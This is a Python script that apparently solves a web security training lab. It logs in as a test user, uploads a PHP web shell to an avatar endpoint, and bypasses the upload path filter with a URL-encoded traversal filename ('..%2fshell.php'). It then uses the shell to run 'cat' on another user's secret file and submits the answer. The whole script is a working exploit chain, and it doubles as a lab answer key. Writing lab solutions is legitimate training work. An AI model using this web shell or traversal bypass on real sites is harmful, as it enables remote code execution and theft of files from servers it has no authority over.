import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

lab.login("wiener", "peter")

page = lab.get("/my-account")
soup = BeautifulSoup(page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

# upload php shell with a path traversal in the filename
# server strips ../ but doesn't catch the url-encoded version ..%2f
# this places the file one directory up where php execution is allowed
shell = b'<?php system($_GET["cmd"]); ?>'
lab.info("Uploading shell with path traversal in filename...")
resp = lab.post("/my-account/avatar", files={
    "avatar": ("..%2fshell.php", shell, "application/x-php")
}, data={
    "user": "wiener",
    "csrf": csrf
})
lab.info(f"Upload status: {resp.status_code}")

# file lands at /files/shell.php instead of /files/avatars/shell.php
secret_resp = lab.get("/files/shell.php?cmd=cat+/home/carlos/secret")
secret = secret_resp.text.strip()
lab.success(f"Secret: {secret}")

lab.post("/submitSolution", data={"answer": secret})
lab.check_solved()
